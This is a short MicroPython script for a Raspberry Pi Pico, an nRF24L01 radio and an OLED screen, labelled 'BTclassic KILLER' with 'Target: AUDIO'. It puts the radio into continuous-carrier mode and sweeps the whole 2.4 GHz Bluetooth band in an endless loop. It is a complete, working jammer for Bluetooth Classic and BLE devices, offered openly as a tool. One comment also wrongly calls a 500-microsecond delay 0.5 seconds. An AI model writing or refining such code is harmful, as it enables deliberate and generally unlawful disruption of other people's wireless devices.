from machine import Pin, SPI, I2C
import ssd1306 # you have to install this package from the thony ide.
import nrf24l01 # keep the nrf24l01 module in the same pico dir you will find it in this repo
import utime
import random

START_CH = 2
END_CH = 80
i2c = I2C(0, sda=Pin(0), scl=Pin(1), freq=1000000)
oled = ssd1306.SSD1306_I2C(128, 64, i2c)
spi = SPI(1, sck=Pin(10), mosi=Pin(11), miso=Pin(12))
csn = Pin(14, Pin.OUT)
ce = Pin(17, Pin.OUT)

def init_nrf():
    try:
        nrf = nrf24l01.NRF24L01(spi, csn, ce)
        nrf.set_channel(80)
        if nrf.reg_read(0x05) != 80:
            return None
        return nrf
    except:
        return None

def main():
    oled.fill(0)
    oled.text("BTclassic KILLER", 0, 0)
    oled.text("__________________",0,8)
    oled.text("Target: AUDIO", 0, 16)
    oled.text("Initializing...", 0, 33)
    oled.show()
    
    nrf = init_nrf()
    if not nrf:
        oled.text("NRF FAIL!", 0, 45)
        oled.show()
        while True: pass

    oled.text("ACTIVE:FULL BAND", 0, 47)
    oled.show()
    print("--- STARTING FULL SPECTRUM SWEEP (2402-2480 MHz) ---")

    channels = list(range(START_CH, END_CH + 1))
    
    REG_RF_CH = 0x05
    REG_RF_SETUP = 0x06
    CMD_CW = 0x90 | 0x06

    while True:
        for ch in channels:
            ce.value(0)
            nrf.reg_write(REG_RF_CH, ch)
            nrf.reg_write(REG_RF_SETUP, CMD_CW)
            ce.value(1)

            utime.sleep_us(500) #0.5 s is good, it works fine with bt-classic as well as BLE

if __name__ == "__main__":
    main()
